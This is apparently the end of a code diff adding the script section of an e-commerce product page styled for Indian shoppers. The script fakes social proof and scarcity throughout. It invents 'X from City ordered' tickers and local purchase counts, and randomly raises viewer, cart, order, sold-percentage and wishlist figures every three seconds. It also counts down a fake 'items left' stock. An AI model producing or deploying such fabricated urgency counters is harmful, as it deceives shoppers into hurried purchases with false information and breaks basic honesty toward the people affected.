+      const items = [];
+      for (let i = 0; i < 12; i++) {
+        const p = pick(FOMO_PEOPLE);
+        const mins = rand(1, 45);
+        items.push('<span><span class="dot"></span>' + p.name + ' from ' + p.city + ' ordered · ' + mins + 'm ago</span>');
+      }
+      const html = items.join('');
+      document.getElementById('fomoTicker').innerHTML = html + html;
+    }
+
+    function updateNearFomo(pin) {
+      nearBuy = rand(12, 28);
+      document.getElementById('nearBuyCount').textContent = nearBuy;
+      document.getElementById('fomoNearText').innerHTML =
+        '<strong id="nearBuyCount">' + nearBuy + '</strong> people near ' + pin + ' bought this in 24 hrs';
+    }
+
+    function syncStock() {
+      document.getElementById('stockLeftBar').textContent = stockLeft;
+    }
+
+    function updateFomoStats() {
+      viewers += rand(-12, 22);
+      viewers = Math.max(720, Math.min(1340, viewers));
+      document.getElementById('viewerCount').textContent = viewers.toLocaleString('en-IN');
+
+      if (Math.random() < 0.55) {
+        cartHour += rand(1, 4);
+        document.getElementById('cartHourCount').textContent = cartHour;
+      }
+      if (Math.random() < 0.35) {
+        ordersToday += rand(1, 2);
+        document.getElementById('orderTodayCount').textContent = ordersToday;
+      }
+      if (Math.random() < 0.12 && soldPct < 97) {
+        soldPct++;
+        document.getElementById('soldPct').textContent = soldPct + '% sold';
+        document.getElementById('soldFill').style.width = soldPct + '%';
+      }
+      if (Math.random() < 0.1 && stockLeft > 1) {
+        stockLeft--;
+        const el = document.getElementById('stockLeft');
+        el.textContent = stockLeft + ' left';
+        if (stockLeft === 1) el.style.color = '#d32f2f';
+        syncStock();
+      }
+      if (Math.random() < 0.4) {
+        cartCount += 1;
+        document.getElementById('cartBadge').textContent = cartCount;
+      }
+      if (Math.random() < 0.3) {
+        wishlist += rand(1, 5);
+        const w = wishlist.toLocaleString('en-IN');
+        document.getElementById('wishlistCount').textContent = w;
+        document.getElementById('wishlistLive').textContent = w;
+      }
+      if (Math.random() < 0.45) {
+        payPending = Math.max(4, Math.min(18, payPending + rand(-2, 3)));
+        document.getElementById('payPending').textContent = payPending;
+      }
+      if (Math.random() < 0.15) {
+        nearBuy += rand(1, 2);
+        document.getElementById('nearBuyCount').textContent = nearBuy;
+      }
+    }
+
+    buildTicker();
+    syncStock();
+    renderReviews();
+    setInterval(updateFomoStats, 3000);
+
+    renderDots();
+    renderColors();
+    renderDetailGallery();
+    goSlide(0);
+
+    const initPin = localStorage.getItem('fk_pin') || '121013';
+    updatePincodeUI(initPin);
+  </script>
+</body>
+</html>
